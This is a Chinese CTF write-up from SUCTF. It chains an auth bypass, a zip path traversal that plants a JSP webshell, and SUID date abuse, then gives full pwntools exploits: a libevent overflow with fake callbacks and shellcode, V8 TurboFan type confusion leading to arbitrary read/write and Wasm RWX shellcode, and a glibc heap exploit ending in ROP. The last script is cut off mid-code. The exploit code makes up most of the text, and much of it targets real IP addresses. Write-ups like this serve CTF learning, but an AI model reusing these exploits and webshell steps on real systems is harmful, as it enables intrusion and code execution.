**7.1 枚举 SUID**

执行：

```Bash
find / -perm -4000 -type f 2>/dev/null
```

发现了一个很反常的文件：

```Plain
/usr/bin/date
```

正常情况下 `date` 不应该是 SUID root。

**7.2 利用原理**

`date -f <file>` 会逐行读取文件，把每一行当成日期解析。

因为它是 SUID root，所以打开文件时用的是 root 权限。

如果目标文件不是合法日期，`date` 会在报错信息里把那一行原样打印出来。

**7.3 直接读出 flag**

执行：

```Bash
/usr/bin/date -f /30b5a132adc9/flag_2d630fb4
```

返回：

```Plain
/usr/bin/date: invalid date ‘suctf{v3ry_e45y_uN4utHOrIZEd_rC3!_!aAA}’
```

于是直接拿到 flag。

**八、完整利用步骤**

**8.1 上传恶意 zip**

将 webshell 打包为 zip。

请求：

```HTTP
POST /jeewms/cgformTemplateController.do?uploadZip=systemController/showOrDownByurl.do
Content-Type: multipart/form-data
```

返回：

```JSON
{
  "success": true,
  "obj": "zip_<JSESSIONID>.zip"
}
```

**8.2 解压到 WebRoot**

请求：

```HTTP
POST /jeewms/cgformTemplateController.do?doAdd=systemController/showOrDownByurl.do
Content-Type: application/x-www-form-urlencoded

templateName=test
templateCode=../../../../
templateType=x
templateZipName=zip_<JSESSIONID>.zip
```

**8.3 执行命令**

```Plain
GET /jeewms/cmd.jsp?cmd=id
```

**8.4 搜索 flag**

```Plain
GET /jeewms/cmd.jsp?cmd=find%20/%20-name%20flag_*%202%3E/dev/null
```

**8.5 用 SUID date 读取**

```Plain
GET /jeewms/cmd.jsp?cmd=/usr/bin/date%20-f%20/<flag_path>
```

**九、稳定性说明**

这条链是稳定的，原因如下：

- 鉴权绕过是纯代码逻辑漏洞，不依赖 race
- 模板解压目录穿越也是纯后端逻辑漏洞，不依赖文件上传竞争
- `templateZipName` 可直接从上传响应中提取
- flag 路径虽然随机，但可以通过 RCE 搜索

唯一会变的是：

- `JSESSIONID`
- 上传后 zip 名称
- flag 真实路径

但这些都可以在线动态获取。

**十、漏洞本质总结**

**10.1 鉴权绕过**

根因：

- 请求 path 与 query string 混在一起做白名单判断
- 白名单采用 `contains()` 模糊匹配

**10.2 任意写文件**

根因：

- `templateCode` 未限制目录跳转
- zip 解压目标目录没有做规范化校验

**10.3 权限配置错误**

根因：

- 容器内 `date` 被错误设置为 SUID root

**十一、最终结论**

这题的核心不是某个单独 0day，而是几处“看起来不严重”的后台实现问题叠加：

1. 认证白名单匹配错误
2. 模板 zip 解压目录穿越
3. SUID 程序错误配置

组合后结果就是：

- 未登录
- 任意写 WebRoot
- 前台 RCE
- 读取 root-only flag

最终 flag：

```Plain
suctf{v3ry_e45y_uN4utHOrIZEd_rC3!_!aAA}
```

# Pwn

## SU_evbuffer 

libevent库进行交互的程序，返回包0x50大小包含了程序的堆地址和libc地址。

在处理响应包的函数中有memcpy缓冲区溢出：

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801234.png)

利用链条如下：

1. Overflow g_bufferevent via memcpy
2. Fake bufferevent at controlled address
3. *(fake_bufferevent + 0x118) = fake_evbuffer
4. fake_evbuffer.callbacks -> fake_cb_entry
5. fake_cb_entry.cb_func = target function
6. evbuffer_add_reference triggers callback
7. callback(rdi=buffer, rsi=info, rdx=cbarg)

最后使用setcontext来执行mprotect之后open flag发送回来即可。

```Python
from pwn import *
import sys

# Context setup
context.arch = 'amd64'
context.log_level = 'debug'

class Exploit:
    def __init__(self, host='127.0.0.1', port=8888):
        self.host = host
        self.port = port
        self.io = None

    def connect(self):
        """Connect to target"""
        self.io = remote(self.host, self.port)
        return self.io

    def send_and_recv(self, data):
        """Send data and receive response"""
        self.io.send(data)
        try:
            return self.io.recv()
        except:
            return b''

    def leak_test(self):
        """Test for information leaks in response"""
        log.info("Testing for information leaks...")

        # Response format: 2B type + 2B pad + 4B IP + 64B hostname = 72 bytes
        # But actual response might be 80 bytes based on evbuffer_add_reference(s, s, 80, ...)

        # Send multiple requests to see if responses are consistent
        ip = "127.0.0.1"
        resp = self.send_and_recv(ip.encode() + b'\x00\n')
        self.libc_base = u64(resp[72:72+8]) - 0x25CB1A
        log.success("libc_base = %s"%hex(self.libc_base))
        self.environ = self.libc_base + 0x222200
        log.success("environ = %s"%hex(self.environ))
        self.heap = u64(resp[0x28:0x28+8])
        log.success("heap = %s"%hex(self.heap))
        self.libc = ELF('./libc.so.6')
        self.setcontext = self.libc_base + self.libc.sym['setcontext']
        log.success("setcontext+61 = %s"%hex(self.setcontext+61))
        self.mprotect = self.libc_base + self.libc.sym['mprotect']
        log.success("mprotect = %s"%hex(self.mprotect))

    def build_fake_evbuffer_with_callback(self, callback_addr, cbarg_addr, base_addr):
        """
        Build fake evbuffer structure with controlled callback

        Layout at base_addr:
        - base_addr + 0x00: evbuffer struct (0x50 bytes)
        - base_addr + 0x50: evbuffer_cb_entry

        The callback invocation is:
        cbent->cb.cb_func(buffer, &info, cbent->cbarg)
        - rdi = buffer (our fake evbuffer address)
        - rsi = &info (on stack)
        - rdx = cbarg (controlled)
        """
        evbuffer = b''

        # evbuffer_chain *first (NULL - no actual data)
        evbuffer += p64(0)

        # evbuffer_chain *last (NULL)
        evbuffer += p64(0)

        # evbuffer_chain **last_with_datap
        evbuffer += p64(base_addr)  # points to first

        # total_len (must be > 0 for some operations)
        evbuffer += p64(0x100)

        # n_add_for_cb
        evbuffer += p64(0x100)

        # n_del_for_cb
        evbuffer += p64(0)

        # freeze flags and lock
        evbuffer += p32(0) * 3
        evbuffer += p32(0)  # padding

        # callbacks.lh_first -> first cb_entry at base_addr + 0x50
        cb_entry_addr = base_addr + 0x50
        evbuffer += p64(cb_entry_addr)

        # parent (NULL)
        evbuffer += p64(0)

        # Now the evbuffer_cb_entry
        cb = b''
        cb += p64(0)
        cb += p64(0)  # le_prev
        cb += p64(callback_addr)  # cb_func - CONTROLLED!
        cb += p64(cbarg_addr)  # cbarg
        cb += p64(1)
        cb += p64(cb_entry_addr)

        return evbuffer + cb

    def test_overflow(self):
        """Test the overflow vulnerability"""
        log.info("Testing overflow...")

        fake_evbuffer = self.heap+0x1a8+0x10
        fake_evbuffer_data = self.build_fake_evbuffer_with_callback(
            callback_addr=self.setcontext+61,  # This will be called
            cbarg_addr=0xdeadbeef,          # rdx = "/bin/sh"
            base_addr=fake_evbuffer
        )
        fake_evbuffer_data = self.build_fake_evbuffer_with_callback(
            callback_addr=self.setcontext+61,  # This will be called
            cbarg_addr=fake_evbuffer+len(fake_evbuffer_data),          # rdx = "/bin/sh"
            base_addr=fake_evbuffer
        )
        rop = flat({
          0xa0: fake_evbuffer+len(fake_evbuffer_data)+0x100,
          0xa8: self.mprotect,
          0x68: fake_evbuffer&~0xfff,
          0x70: 0x3000,
          0x88: 7,
      }, filler=b'\x00', length=0x100)

        ip = b"127.0.0.1"
        # Build payload
        # Offset to g_bufferevent is 0x28 from g_tcp_context
        offset = 0x20

        # First 0x28 bytes go to g_tcp_context buffer
        # Then we overwrite g_bufferevent

        payload = ip + b'\x00'  # Valid IP with null terminator
        payload += b'B' * (offset - len(payload))  # Pad to reach g_bufferevent
        payload += p64(1)
        payload += p64(fake_evbuffer-8-0x118)
        payload += p64(fake_evbuffer)
        payload += fake_evbuffer_data # Fake g_bufferevent
        payload += rop
        payload += p64(fake_evbuffer+len(fake_evbuffer_data)+0x108)
        payload += asm(shellcraft.open('flag'))
        payload += asm(shellcraft.sendfile(8, 'rax', 0, 0x30))

        # Make sure g_is_tcp (at offset 0x20) is 1
        # Actually, g_is_tcp is already 1 for TCP connections

        log.info(f"Payload length: {len(payload)}")
        log.info(f"Payload: {payload.hex()}")

        self.io.send(payload + b'\n')
        self.io.recv()

    def exploit(self):
        self.connect()

        # Step 1: Analyze program behavior
        self.leak_test()

        # Step 2: Test overflow
        self.test_overflow()

        self.io.interactive()

def main():
    exp = Exploit('101.245.104.190', '10006')
    #exp = Exploit('127.0.0.1', '8888')
    exp.exploit()

if __name__ == '__main__':
    main()
```

## SU_Box

**程序逻辑**

服务端逻辑非常简单，核心代码在 `App.java`:

1. 读取用户输入的 JavaScript，直到遇到单独一行 `EOF`
2. 创建一个 V8 runtime
3. 注册一个 Java 方法 `log`
4. 执行用户提供的 JS

这里最重要的限制是:

- 没有文件 API
- 没有命令执行 API
- 没有额外暴露危险的 Java 对象
- JS 层唯一能稳定用到的输出能力基本就是 `log(...)`

所以如果想拿 flag，只能从 V8 本身做内存破坏，最终做到任意读写和代码执行。

**环境判断**

题目目录里已经给出了完整部署文件:

- `Dockerfile`
- `docker-compose.yml`
- `ctf.xinetd`
- `run.sh`
- `start.sh`
- `linux-x86_64.jar`

`Dockerfile` 会把 `App.java` 编译后挂到 xinetd 上，flag 放在 `/flag`。这一套部署文件本身是完整的，没有缺少关键依赖。

从利用脚本实际使用的对象布局可以确认几件事:

- 目标是 `linux-x64`
- 当前构建没有启用 pointer compression
- 当前构建没有 heap sandbox / external pointer table 这类额外保护

依据不是“猜版本号”，而是现成利用本身的对象布局:

- `addrof(obj) - 1n` 直接得到完整地址，而不是压缩指针
- 伪造 `ExternalOneByteString` 时，`resource` / `resource_data` 可以直接写原始地址
- `ArrayBuffer` / `BigUint64Array` / `WasmInstanceObject` 的偏移都符合传统 64-bit 非压缩布局

这几点对后面的伪造对象非常关键。

**漏洞本质**

这题命中的是一类 TurboFan JIT 类型混淆问题，利用风格和 `CVE-2021-30632` 同类。重点不是做出一个大范围 OOB，而是让优化后的代码错误地按另一种元素类型解释固定槽位。

题里实际稳定利用到的是两条“自然类型混淆”链:

1. `object -> double`，用于实现 `addrof`
2. `double -> object`，用于实现 `fakeobj`

这里访问的都是固定下标 `20`，但本质不是数组长度真的被扩出来了，而是 TurboFan 优化后对元素种类的假设错了。

**第一阶段: 做出****`addrof`**

第一条链的核心函数是:

```JavaScript
function foo(y){ x = y; }
function r20(){ return x[20]; }
function w20(v){ x[20] = v; }
```

通过喂多组数组把 JIT 热起来后，可以让某个槽位在写入对象、读取时却被当成 `double` 解释，最后得到:

```JavaScript
function addrof(o){
  w20(o);
  return ftoi(r20());
}
```

其中 `ftoi` 就是标准的 `Float64Array + BigUint64Array` 共用 buffer 做位解释。

**第二阶段: 做出`fakeobj`**

第二条链使用另一组数组和不同的 warmup 次数，稳定得到反方向的类型混淆:

```JavaScript
function bar(y){ y2 = y; }
function g20(){ return y2[20]; }

function fakeobj(addr){
  darr[20] = itof(addr);
  bar(darr);
  return g20();
}
```

利用思路:

1. 先用 `addrof` 泄露真实对象地址
2. 把这个地址按 `double` 形式写进数组槽位
3. 再让另一条链把这个槽位按对象解释出来

到这里，`addrof` 和 `fakeobj` 这两个基础原语就都齐了。

**第三阶段: 先做任意读**

**ExternalOneByteString**这个对象特别适合做读原语，原因很直接:

1. `log(...)` 最终会把对象按字符串输出
2. `ExternalOneByteString` 本身带有原始数据指针

只要能伪造一个 `ExternalOneByteString`，就能让 V8 把任意地址处的数据当成字符串内容，再借助 `log` 或 `charCodeAt` 读出来。

当前 `solve.py` 里并没有“动态扫描整个 read-only space 找 map”，而是用了一个和当前构建绑定的相对偏移:

```JavaScript
var ro_true = addrof(true) - 1n;
var ro_base = ro_true & ~0xffffn;
var ext_map = ro_base + 0x2c51n;
```

这不是绝对地址硬编码，因为基址仍然来自运行时泄露；但 `0x2c51` 这个偏移是和当前远程构建绑定的。也就是说，脚本已经规避了 ASLR，但没有完全做成跨版本通杀。

**伪造`ExternalOneByteString`**

伪对象头的关键字段是:

- `map = ext_map`
- `length = len << 32`
- `resource = addr`
- `resource_data = addr`

脚本中的设置方式是:

```JavaScript
function set_ext(addr, len){
  carrier1[0] = itof(ext_map);
  carrier1[1] = itof(BigInt(len) << 32n);
  carrier1[2] = itof(addr);
  carrier1[3] = itof(addr);
}
```

然后把它解释成对象:

```JavaScript
var ext = fakeobj(fake_str_addr);
```

最后利用 `charCodeAt` 把目标地址的字节读出来:

```JavaScript
function read64(addr){
  set_ext(addr, 8);
  let v = 0n;
  for (let i = 0; i < 8; i++) {
    v |= BigInt(ext.charCodeAt(i)) << (8n * BigInt(i));
  }
  return v;
}
```

这样就得到了稳定的 64-bit 任意读。

**第四阶段: 任意写**

拿到任意读之后，最稳的写法不是继续玩字符串，而是伪造 `BigUint64Array`。

选择它的原因:

- 元素宽度正好是 8 字节
- JS 可以直接读写 `BigInt`
- 不需要自己拼字节

先创建一个真的 typed array:

```JavaScript
var ab = new ArrayBuffer(0x100);
var rw = new BigUint64Array(ab);
```

然后通过任意读把真实对象头里的关键字段全泄露出来:

- `rw_map`
- `rw_props`
- `rw_elems`
- `rw_buf`
- `ArrayBuffer` 的 backing store

接着按真实布局复制一个假对象头:

```JavaScript
carrier2[0] = itof(rw_map);
carrier2[1] = itof(rw_props);
carrier2[2] = itof(rw_elems);
carrier2[3] = itof(rw_buf);
carrier2[4] = itof(0n);
carrier2[5] = itof(0x100n);
carrier2[6] = itof(0x20n);
carrier2[7] = itof(bs);
carrier2[8] = itof(0n);
```

再通过 `fakeobj` 取回它:

```JavaScript
var fake_rw = fakeobj(fake_rw_addr);
```

最后把 data pointer 指向目标地址，就能得到通用任意读写:

```JavaScript
function arb_read64(addr){
  carrier2[7] = itof(addr);
  return fake_rw[0];
}

function arb_write64(addr, val){
  carrier2[7] = itof(addr);
  fake_rw[0] = BigInt(val);
}
```

**第五阶段: RCE**

拿到任意读写以后，最常规也最稳的是走 Wasm RWX。

先创建一个最小 wasm:

```JavaScript
var wasm_code = new Uint8Array([...]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_inst = new WebAssembly.Instance(wasm_mod);
var f = wasm_inst.exports.main;
```

再泄露 `wasm_inst` 地址:

```JavaScript
var wasm_addr = addrof(wasm_inst) - 1n;
```

当前脚本使用的 RWX 指针偏移是:

```JavaScript
var rwx = arb_read64(wasm_addr + 0x80n);
```

这里的 `0x80` 同样是和当前构建绑定的对象布局偏移。

接着把 shellcode 直接写到 RWX 页里，再调用 wasm 导出函数即可执行。

最终 shellcode 是一段短小的 `amd64 Linux` 代码，逻辑是:

1. `open("/flag", O_RDONLY, 0)`
2. `sendfile(1, fd, 0, 0x7fffffff)`
3. 返回

之所以用 `sendfile`，是因为它比 `read + write` 更短，更适合直接塞进 Wasm 的 RWX 页里，而且 stdout 会直接回显到 socket。

执行后远程直接返回:

```Plain
SUCTF{y0u_kn@w_v8_p@tch_gap_we1!}
```

## SU_minivfs

题目实现了一个极简虚拟文件系统，只暴露四个命令：

- `touch path size auth`
- `rm path auth`
- `cat path auth`
- `write path size auth`

表面看 `auth` 像权限校验，实际上可以本地完全复现，所以真正的利用重点不在鉴权，而在堆管理。

完整利用链如下：

1. 利用删除后的残留指针泄露 `libc` 和 `heap`
2. 用 House of Einherjar 做出 chunk overlap
3. 用 largebin attack 修改 `mp_.tcache_bins`
4. 在 safe-linking 下对 `0x420` 大小 chunk 做 tcache poisoning
5. 先打 `environ` 泄露栈地址，再打到稳定栈窗口
6. 通过 ROP 做 ORW，但不能直接读 `/flag`
7. 先枚举 `/`，找到真实 `flag_<hex>` 文件，再读取真 flag

**1. 基础分析**

`mini_vfs` 的保护：

- Full RELRO
- Canary
- NX
- PIE
- SHSTK
- IBT

附件 `libc.so.6` 版本为：

```Plain
GNU C Library (Ubuntu GLIBC 2.41-6ubuntu1.2) stable release version 2.41
```

程序开启了 seccomp，重点封掉了创建新进程相关 syscall，例如：

- `execve`
- `execveat`
- `fork`
- `vfork`
- `clone`
- `clone3`

因此最终打法不能走 `system("/bin/sh")`，而要走纯 syscall ORW。

鉴权逻辑可以直接在脚本里重现：

```Python
def h(path: str) -> int:
    x = 0x811C9DC5
    for b in path.encode():
        x ^= b
        x = (x * 0x1000193) & 0xFFFFFFFF
    y = x
    y ^= y >> 16
    y = (y * 0x7FEB352D) & 0xFFFFFFFF
    y ^= y >> 15
    y = (y * 0x846CA68B) & 0xFFFFFFFF
    y ^= y >> 16
    return y & 0xFFFFFFFF

def auth(path: str) -> int:
    return h(path) ^ 0xA5A5A5A5
```

所以任意路径都可以合法操作，真正的难点完全在堆利用。

**2. 第一阶段：残留指针泄露 libc 和 heap**

`bootstrap()` 对应第一段利用：

```Plain
touch % 0x500
touch 6 0x428
touch ! 0x418
rm %
touch X 0x418
touch # 0x418
cat X
```

删除后仍能从重用 chunk 里读到旧元数据，因此可以直接拿到：

- `leak[:8]` -> `libc` 泄露
- `leak[0x10:0x18]` -> `heap` 泄露

脚本中的恢复公式：

```Python
libc_base = libc_leak - 0x210F50
heap_base = heap_leak - 0x290
```

**3. 第二阶段：House of Einherjar 做 overlap**

`build_overlap()` 的目标是制造可控重叠块。

布局：

```Plain
)  0x4f8
+  0x500
,  0x418
.  0x418
```

核心是伪造相邻 chunk 元数据：

```Python
b[0x4F0:0x4F8] = p64(0)
b[0x4F8:0x4FF] = p64(0x11)[:7]

a[0x4F0:0x4F8] = p64(0x500)
```

之后 `rm("+")` 再重新申请 `touch("0", 0x500)`，得到可覆盖更大范围的 overlap chunk。

**4. 第三阶段：largebin attack 扩大 tcache 范围**

默认情况下 `0x420` 这类 chunk 不会进入我们想要的 tcache 控制路径，所以需要先改 `mp_.tcache_bins`。

脚本里：

```Python
mp_bins = libc_base + 0x2101E8
```

利用 overlap chunk 改 largebin 链表指针，触发 largebin 写入，把 `mp_.tcache_bins` 附近改掉。结果是：

- `0x420` 大小也能进入可控 tcache
- 后续可以对这类 chunk 做 safe-linking 下的 poisoning

**5. 第四阶段：safe-linking 下的 tcache poisoning**

真正的任意地址分配由 `poison_tcache_420()` 完成。

safe-linking 伪造方式：

```Python
fake_next = target ^ (f_user >> 12)
```

其中：

```Python
f_user = heap_base + 0x1850
```

脚本是通过重叠块 `0` 覆盖残留的 tcache `next` 指针：

```Python
payload[0x430:0x438] = p64(target ^ (f_user >> 12))
```

然后连续申请两次 `0x418`：

1. 第一次取走链头
2. 第二次直接落到伪造的 `target`

**6. 第五阶段：先打 environ，再打栈窗口**

拿到任意地址分配后，最稳定的第一目标是 `environ`：

```Python
target = libc_base + libc.sym["environ"] - 0x18
```

减 `0x18` 是因为当前读逻辑会从 `data_ptr` 开始顺序读固定长度，正好在返回内容偏移 `0x18` 处读到真正的 `environ`：

```Python
stack = u64(leak[0x18:0x20])
```

之后把 chunk 再打到：

```Python
stack_target = stack_leak - 0x618
```

在这个 `0x418` 窗口里，刚好能同时覆盖：

- canary：`0x268`
- saved rbp：`0x270`
- saved rip：`0x278`

虽然我们已经能把 chunk 打到栈上，但 `write` 并不是把 socket 数据直接写进目标地址，而是：

1. 先 `read` 到当前函数自己的栈上临时缓冲区
2. 再 `memcpy` 到目标 slot

也就是说，如果你把目标正好打到“当前这次 `write` 正在使用的读入栈帧”，控制流会在 `read` / `memcpy` 的时序里打架，稳定性很差。

因此更稳的做法是：

1. 先泄露 `environ`
2. 选一块更外层、更稳定的栈窗口
3. 再在这块栈窗口上铺 ROP

**7. 优化后的稳妥打法**

**7.1 第一段：只做目录枚举**

ROP 链仅完成：

1. `openat(AT_FDCWD, "/", O_RDONLY)`
2. `getdents64(root_fd, buf, 0x100)`
3. `write(1, buf, 0x100)`

然后脚本本地解析 `linux_dirent64`，在目录项里查找 `flag_<hex>`：

```Python
def parse_dirents(buf: bytes) -> list[bytes]:
    names = []
    off = 0
    while off + 19 <= len(buf):
        reclen = u16(buf[off + 16 : off + 18])
        if reclen < 19 or off + reclen > len(buf):
            break
        name = buf[off + 19 : off + reclen].split(b"\\x00", 1)[0]
        names.append(name)
        off += reclen
    return names
```

**7.2 第二段：精确读取真实文件**

第二次连接重新完成同样的堆利用和栈劫持，但最终 ROP 不再猜目录偏移，而是直接：

1. `openat(AT_FDCWD, "/flag_<hex>", O_RDONLY)`
2. `read(real_flag_fd, buf, 0x100)`
3. `write(1, buf, 0x100)`

实测在线环境大多数时候在一段时间内文件名稳定，但偶发会发生后端实例漂移。也就是说：

1. 第一段泄露出来的 `flag_<hex>` 可能对应实例 A
2. 第二段连接时你可能被分到实例 B

因此新版脚本做了自动重试：

- 每次先泄露当前实例的真实文件名
- 再立即二次连接读取
- 如果没有拿到真实 flag，就重新来一轮

**8. 最终利用链**

整条链汇总如下：

1. 删除后读残留指针，泄露 `libc_base` 和 `heap_base`
2. House of Einherjar 做 overlap
3. largebin attack 修改 `mp_.tcache_bins`
4. 对 `0x420` chunk 做 safe-linking 下的 tcache poisoning
5. 打 `environ - 0x18` 泄露栈
6. 再次 poisoning，把 chunk 打到稳定栈窗口 `stack_leak - 0x618`
7. 覆盖 canary 后的 `rbp/rip`，栈迁移到自铺 ROP
8. 第一段 ROP：枚举 `/`，找到真实 `flag_<hex>`
9. 第二段 ROP：精确打开该文件并输出内容

```Python
import os
import re
import shutil

from pwn import *

context.binary = elf = ELF("./mini_vfs", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = args.LOG_LEVEL or "info"
context.arch = "amd64"

PROMPT = b"vfs> "
HOST = "1.95.73.223"
PORT = 10000
LD_CANDIDATES = (
    "./ld-linux-x86-64.so.2",
    "./usr/lib64/ld-linux-x86-64.so.2",
)
LIBC_DIR_CANDIDATES = (
    "./usr/lib/x86_64-linux-gnu",
    ".",
)

LIBC_LEAK_OFF = 0x210F50
HEAP_LEAK_OFF = 0x290
MP_TCACHE_BINS_OFF = 0x2101E8
F_USER_OFF = 0x1850
STALE_NEXT_OFF = 0x430
STACK_FINAL_OFF = 0x618
STACK_SLOT = "#"
STACK_CANARY_OFF = 0x268
STACK_SAVED_RBP_OFF = 0x270
STACK_SAVED_RIP_OFF = 0x278

POP_RDI_OFF = 0x119E9C
POP_RSI_OFF = 0x11B07D
POP_RAX_OFF = 0xE4E97
POP_RDX_LEAVE_RET_OFF = 0x9E68D
SYSCALL_RET_OFF = 0x9F4A6
XCHG_EDI_EAX_RET_OFF = 0x1AA936

GETDENTS_SIZE = 0x100
FLAG_READ_SIZE = 0x100
MAX_ATTEMPTS = int(args.ATTEMPTS or 6)

def h(path: str) -> int:
    x = 0x811C9DC5
    for b in path.encode():
        x ^= b
        x = (x * 0x1000193) & 0xFFFFFFFF
    y = x
    y ^= y >> 16
    y = (y * 0x7FEB352D) & 0xFFFFFFFF
    y ^= y >> 15
    y = (y * 0x846CA68B) & 0xFFFFFFFF
    y ^= y >> 16
    return y & 0xFFFFFFFF

def auth(path: str) -> int:
    return h(path) ^ 0xA5A5A5A5

def resolve_local_env():
    ld = next((p for p in LD_CANDIDATES if os.path.exists(p)), None)
    libc_dir = next(
        (
            p
            for p in LIBC_DIR_CANDIDATES
            if os.path.exists(os.path.join(p, "libc.so.6"))
        ),
        None,
    )
    if not ld or not libc_dir:
        raise FileNotFoundError(
            "missing local runtime files: expected ld-linux-x86-64.so.2 and libc.so.6 "
            "under the current directory"
        )
    return ld, libc_dir

def start():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        if os.name == "nt" and not (
            shutil.which("qemu-x86_64") or shutil.which("qemu-x86_64.exe")
        ):
            raise OSError(
                "local ELF execution needs Linux/WSL/QEMU; current host is Windows. "
                "Use REMOTE=1 or run the script inside a Linux userspace."
            )
        ld, libc_dir = resolve_local_env()
        argv = [ld, "--library-path", libc_dir, "./mini_vfs"]
        io = process(argv, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    io.recvuntil(PROMPT)
    return io

def cmd(io, line: bytes) -> bytes:
    io.sendline(line)
    return io.recvuntil(PROMPT, drop=False)

def touch(io, path: str, size: int):
    return cmd(io, f"touch {path} {hex(size)} {auth(path)}".encode())

def rm(io, path: str):
    return cmd(io, f"rm {path} {auth(path)}".encode())

def cat_(io, path: str) -> bytes:
    io.sendline(f"cat {path} {auth(path)}".encode())
    return io.recvuntil(PROMPT, drop=True)

def cat_fixed(io, path: str, size: int) -> bytes:
    io.sendline(f"cat {path} {auth(path)}".encode())
    data = io.recvn(size)
    io.recvn(1)
    io.recvuntil(PROMPT)
    return data

def write_(io, path: str, data: bytes):
    n = len(data)
    io.sendline(f"write {path} {hex(n)} {auth(path)}".encode())
    io.recvuntil(b"> ")
    io.send(data)
    return io.recvuntil(PROMPT, drop=False)

def bootstrap(io):
    touch(io, "%", 0x500)
    touch(io, "6", 0x428)
    touch(io, "!", 0x418)
    rm(io, "%")
    touch(io, "X", 0x418)
    touch(io, "#", 0x418)
    leak = cat_fixed(io, "X", 0x418)
    libc_leak = u64(leak[:8])
    heap_leak = u64(leak[0x10:0x18])
    libc_base = libc_leak - LIBC_LEAK_OFF
    heap_base = heap_leak - HEAP_LEAK_OFF
    log.info(f"libc_leak = {libc_leak:#x}")
    log.info(f"heap_leak = {heap_leak:#x}")
    log.info(f"libc_base = {libc_base:#x}")
    log.info(f"heap_base = {heap_base:#x}")
    return libc_base, heap_base

def build_overlap(io, heap_base: int):
    a_base = heap_base + 0x1410
    touch(io, ")", 0x4F8)
    touch(io, "+", 0x500)
    touch(io, ",", 0x418)
    touch(io, ".", 0x418)

    b = bytearray(b"B" * 0x4FF)
    b[0x4F0:0x4F8] = p64(0)
    b[0x4F8:0x4FF] = p64(0x11)[:7]
    write_(io, "+", bytes(b))

    a = bytearray(b"A" * 0x4F8)
    a[0x00:0x08] = p64(a_base)
    a[0x08:0x10] = p64(a_base)
    a[0x10:0x18] = p64(a_base)
    a[0x18:0x20] = p64(a_base)
    a[0x4F0:0x4F8] = p64(0x500)
    write_(io, ")", bytes(a))

    rm(io, "+")
    touch(io, "0", 0x500)
    return a_base

def enable_large_tcache(io, libc_base: int):
    mp_bins = libc_base + MP_TCACHE_BINS_OFF
    rm(io, ")")
    touch(io, "1", 0x428)
    touch(io, "$", 0x418)

    rm(io, "1")
    touch(io, "B", 0x500)
    leak = cat_fixed(io, "0", 0x500)
    payload = bytearray(leak[:0x20])
    payload[0x18:0x20] = p64(mp_bins - 0x20)
    write_(io, "0", bytes(payload))
    rm(io, "!")
    touch(io, "&", 0x500)

def poison_tcache_420(
    io, heap_base: int, dummy: str, head: str, reclaim: str, victim: str, target: int
):
    f_user = heap_base + F_USER_OFF
    rm(io, dummy)
    rm(io, head)
    payload = bytearray(cat_fixed(io, "0", 0x500)[: STALE_NEXT_OFF + 8])
    payload[STALE_NEXT_OFF : STALE_NEXT_OFF + 8] = p64(target ^ (f_user >> 12))
    write_(io, "0", bytes(payload))
    touch(io, reclaim, 0x418)
    touch(io, victim, 0x418)

def leak_stack(io, heap_base: int, libc_base: int) -> int:
    target = libc_base + libc.sym["environ"] - 0x18
    poison_tcache_420(io, heap_base, ",", "$", "1", "!", target)
    leak = cat_fixed(io, "!", 0x418)
    stack = u64(leak[0x18:0x20])
    log.info(f"stack_leak = {stack:#x}")
    return stack

def prepare_stack_slot(io):
    libc_base, heap_base = bootstrap(io)
    build_overlap(io, heap_base)
    enable_large_tcache(io, libc_base)
    stack_leak = leak_stack(io, heap_base, libc_base)
    stack_target = stack_leak - STACK_FINAL_OFF
    if stack_target & 0xF:
        raise ValueError(f"unaligned stack target: {stack_target:#x}")
    poison_tcache_420(io, heap_base, STACK_SLOT, "1", "1", STACK_SLOT, stack_target)
    blob = cat_fixed(io, STACK_SLOT, 0x418)
    canary = u64(blob[STACK_CANARY_OFF : STACK_CANARY_OFF + 8])
    saved_rbp = u64(blob[STACK_SAVED_RBP_OFF : STACK_SAVED_RBP_OFF + 8])
    saved_rip = u64(blob[STACK_SAVED_RIP_OFF : STACK_SAVED_RIP_OFF + 8])
    log.info(f"stack_target = {stack_target:#x}")
    log.info(f"canary = {canary:#x}")
    log.info(f"saved_rbp = {saved_rbp:#x}")
    log.info(f"saved_rip = {saved_rip:#x}")
    return libc_base, stack_target, blob, canary

def parse_dirents(buf: bytes) -> list[bytes]:
    names = []
    off = 0
    while off + 19 <= len(buf):
        reclen = u16(buf[off + 16 : off + 18])
        if reclen < 19 or off + reclen > len(buf):
            break
        name = buf[off + 19 : off + reclen].split(b"\x00", 1)[0]
        names.append(name)
        off += reclen
    return names

def build_dirents_rop(libc_base: int, stack_target: int):
    pop_rdi = libc_base + POP_RDI_OFF
    pop_rsi = libc_base + POP_RSI_OFF
    pop_rax = libc_base + POP_RAX_OFF
    pop_rdx_leave_ret = libc_base + POP_RDX_LEAVE_RET_OFF
    syscall_ret = libc_base + SYSCALL_RET_OFF
    xchg_edi_eax_ret = libc_base + XCHG_EDI_EAX_RET_OFF
    root = stack_target + 0x120
    buf = stack_target + 0x180
    frame1 = stack_target + 0x298
    frame2 = frame1 + 0x58
    frame3 = frame2 + 0x40

    chain = [
        frame2,
        pop_rdi,
        -100,
        pop_rsi,
        root,
        pop_rax,
        257,
        syscall_ret,
        xchg_edi_eax_ret,
        pop_rdx_leave_ret,
        GETDENTS_SIZE,
        frame3,
        pop_rsi,
        buf,
        pop_rax,
        217,
        syscall_ret,
        pop_rdx_leave_ret,
        GETDENTS_SIZE,
        0,
        pop_rdi,
        1,
        pop_rsi,
        buf,
        pop_rax,
        1,
        syscall_ret,
    ]
    return pop_rdx_leave_ret, frame1, flat(chain), {0x120: b"/\x00"}

def build_read_flag_rop(libc_base: int, stack_target: int, path: bytes):
    pop_rdi = libc_base + POP_RDI_OFF
    pop_rsi = libc_base + POP_RSI_OFF
    pop_rax = libc_base + POP_RAX_OFF
    pop_rdx_leave_ret = libc_base + POP_RDX_LEAVE_RET_OFF
    syscall_ret = libc_base + SYSCALL_RET_OFF
    xchg_edi_eax_ret = libc_base + XCHG_EDI_EAX_RET_OFF
    path_addr = stack_target + 0x120
    buf = stack_target + 0x180
    frame1 = stack_target + 0x298
    frame2 = frame1 + 0x58
    frame3 = frame2 + 0x40

    chain = [
        frame2,
        pop_rdi,
        -100,
        pop_rsi,
        path_addr,
        pop_rax,
        257,
        syscall_ret,
        xchg_edi_eax_ret,
        pop_rdx_leave_ret,
        FLAG_READ_SIZE,
        frame3,
